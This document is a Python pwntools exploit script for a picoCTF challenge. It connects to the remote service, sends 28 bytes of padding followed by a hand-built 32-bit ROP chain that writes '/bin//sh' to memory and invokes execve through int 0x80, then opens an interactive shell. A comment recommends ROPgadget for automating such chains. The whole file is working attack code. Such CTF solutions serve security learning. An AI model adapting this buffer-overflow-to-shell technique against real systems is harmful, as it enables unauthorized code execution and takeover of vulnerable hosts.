from pwn import *
from struct import pack

context.log_level = "debug"

# r = process("./vuln")
r = remote("saturn.picoctf.net", 53418)


# Padding goes here
p = b""

p += pack("<I", 0x080583C9)  # pop edx ; pop ebx ; ret
p += pack("<I", 0x080E5060)  # @ .data
p += pack("<I", 0x41414141)  # padding
p += pack("<I", 0x080B074A)  # pop eax ; ret
p += b"/bin"
p += pack("<I", 0x08059102)  # mov dword ptr [edx], eax ; ret
p += pack("<I", 0x080583C9)  # pop edx ; pop ebx ; ret
p += pack("<I", 0x080E5064)  # @ .data + 4
p += pack("<I", 0x41414141)  # padding
p += pack("<I", 0x080B074A)  # pop eax ; ret
p += b"//sh"
p += pack("<I", 0x08059102)  # mov dword ptr [edx], eax ; ret
p += pack("<I", 0x080583C9)  # pop edx ; pop ebx ; ret
p += pack("<I", 0x080E5068)  # @ .data + 8
p += pack("<I", 0x41414141)  # padding
p += pack("<I", 0x0804FB90)  # xor eax, eax ; ret
p += pack("<I", 0x08059102)  # mov dword ptr [edx], eax ; ret
p += pack("<I", 0x08049022)  # pop ebx ; ret
p += pack("<I", 0x080E5060)  # @ .data
p += pack("<I", 0x08049E39)  # pop ecx ; ret
p += pack("<I", 0x080E5068)  # @ .data + 8
p += pack("<I", 0x080583C9)  # pop edx ; pop ebx ; ret
p += pack("<I", 0x080E5068)  # @ .data + 8
p += pack("<I", 0x080E5060)  # padding without overwrite ebx
p += pack("<I", 0x0804FB90)  # xor eax, eax ; ret
p += pack("<I", 0x0808055E)  # inc eax ; ret
p += pack("<I", 0x0808055E)  # inc eax ; ret
p += pack("<I", 0x0808055E)  # inc eax ; ret
p += pack("<I", 0x0808055E)  # inc eax ; ret
p += pack("<I", 0x0808055E)  # inc eax ; ret
p += pack("<I", 0x0808055E)  # inc eax ; ret
p += pack("<I", 0x0808055E)  # inc eax ; ret
p += pack("<I", 0x0808055E)  # inc eax ; ret
p += pack("<I", 0x0808055E)  # inc eax ; ret
p += pack("<I", 0x0808055E)  # inc eax ; ret
p += pack("<I", 0x0808055E)  # inc eax ; ret
p += pack("<I", 0x0804A3D2)  # int 0x80

# I must say, I hate constructing ROPchain by hand, so when
# there's possibility to use automation to help us do boring
# work, don't hesitate. Here I use ROPchain which can get by
# `pip install ROPgadget`, also most writeups use.
 
r.recvuntil(b"!\n")
r.sendline(cyclic(28) + p)
r.interactive()
